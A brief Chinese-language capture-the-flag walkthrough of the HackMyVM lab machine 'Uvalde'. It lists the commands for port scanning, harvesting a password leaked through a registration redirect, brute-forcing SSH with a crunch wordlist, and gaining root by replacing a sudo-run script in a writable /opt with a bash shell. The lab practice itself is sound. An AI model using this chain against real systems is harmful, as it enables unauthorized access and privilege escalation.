# Uvalde

2025.02.21 https://hackmyvm.eu/machines/machine.php?vm=Uvalde

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 匿名登陆，查看 output 文件内容，发现一个用户名 matthew 。

扫描 80 web，发现有登陆页面和注册页面，在注册页面中 http://192.168.5.40/create_account.php 输入 matthew 显示用户名已经存在，输入新用户名，发现 Location 会回显用户密码：

```
curl --data-urlencode "username=test1"  http://192.168.5.40/create_account.php -vv

Location: success.php?dXNlcm5hbWU9dGVzdDEmcGFzc3dvcmQ9dGVzdDEyMDI1QDIxOTE=
```

解密后得到 username=test1&password=test12025@2191 使用此凭据登陆，没发现什么内容。经过多次注册，发现用户的密码格式为: 用户名+年@四位随机数，进行密码字典构造，尝试破解 matthew 用户的密码：

```
crunch 16 16 -t dddddddddddd%%%% -p matthew2025@ -o pass.txt

crunch 16 16 -t matthew2025@%%%%  -l aaaaaaaaaaa@aaaaa
```

爆破出密码：matthew2023@1554 ssh 登陆该用户，得到 user flag：

```
matthew@uvalde:~$ cat user.txt
6e4136fbed8f8c691996dbf42697d460
```

sudo -l 发现 (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack 查看该脚本内容，没有可以利用的地方，发现 /opt 目录对其他组用户可以写，所以直接删除该文件，然后重建：

```
cd /opt
rm superhack
echo '/bin/bash -p' > superhack
chmod +x superhack
sudo /bin/bash /opt/superhack
root@uvalde:~# cat root.txt
59ec54537e98a53691f33e81500f56da
```
